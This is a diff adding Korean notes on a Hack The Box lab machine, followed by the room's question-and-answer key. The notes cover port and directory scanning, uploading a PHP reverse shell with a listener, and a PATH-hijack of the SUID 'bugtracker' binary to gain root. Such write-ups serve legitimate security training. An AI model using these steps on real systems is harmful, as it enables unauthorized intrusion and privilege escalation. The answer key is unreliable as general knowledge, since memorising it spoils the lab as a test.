@@ -1,0 +1,105 @@
+1. 포트 확인
+nmap -sV htb_ip
+
+
+2. 파일 위치 찾기
+gobuster dir -u http://<대상_IP> -w /usr/share/wordlists/dirb/common.txt
+or
+gobuster dir -u http://<대상_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+
+
+3. 웹쉘 업로드
+깃 허브에서 php-reverse-shell-master 다운 후
+웹 쉘 업로드 및 업로드 위치로 이동
+php-reverse-shell-master 의 php 파일에서 ip, port 변경
+ip 는 tun0 와 같은 ip
+터미널 명령어 np -lvnp 포트
+이러면 터미널에서 웹쉘 가능
+
+
+4. user flag 찾기
+
+
+5. root flag 찾기
+기본 플래그랑 다르게 권한이 필요함
+ssh robert@htb_ip 로 접속
+
+/usr/bin/bugtracker
+1 (아무거나)
+
+cd /tmp
+
+echo '/bin/sh' > cat
+chmod +x cat
+
+export PATH=/tmp:$PATH
+
+/usr/bin/bugtracker
+1 (아무거나)
+
+그냥 cat 명령어 사용시 안되니
+/bin/cat /root/root.txt
+로 플래그 확인
+
+
+-------------------------------
+
+
+1. With what kind of tool can intercept web traffic?
+웹 트래픽을 가로챌 수 있는 도구는 어떤 종류인가요?
+
+> proxy
+
+
+2. What is the path to the directory on the webserver that returns a login page?
+웹 서버에서 로그인 페이지를 반환하는 디렉터리의 경로는 무엇입니까?
+
+> /cdn-cgi/login
+
+
+3. What can be modified in Firefox to get access to the upload page?
+업로드 페이지에 접근하려면 파이어폭스에서 무엇을 수정해야 할까요?
+
+> cookie
+
+
+4. What is the access ID of the admin user?
+관리자 사용자의 액세스 ID는 무엇입니까?
+
+> 34322
+
+
+5. On uploading a file, what directory does that file appear in on the server?
+파일을 업로드하면 서버에서 해당 파일은 어느 디렉토리에 나타나나요?
+
+> /uploads
+
+
+6. What is the file that contains the password that is shared with the robert user?
+로버트 사용자와 공유되는 비밀번호가 들어 있는 파일은 무엇입니까?
+
+> db.php
+
+
+7. What executible is run with the option "-group bugtracker" to identify all files owned by the bugtracker group?
+bugtracker 그룹이 소유한 모든 파일을 식별하기 위해 "-group bugtracker" 옵션과 함께 실행되는 실행 파일은 무엇입니까?
+
+> find
+
+
+8. Regardless of which user starts running the bugtracker executable, what's user privileges will use to run?
+어떤 사용자가 버그트래커 실행 파일을 실행하든, 어떤 사용자 권한이 사용되어 실행될까요?
+
+> root
+
+
+9. What SUID stands for?
+SUID는 무엇의 약자입니까?
+
+> Set owner User ID
+
+
+10. What is the name of the executable being called in an insecure manner?
+안전하지 않은 방식으로 호출되는 실행 파일의 이름은 무엇입니까?
+
+> cat
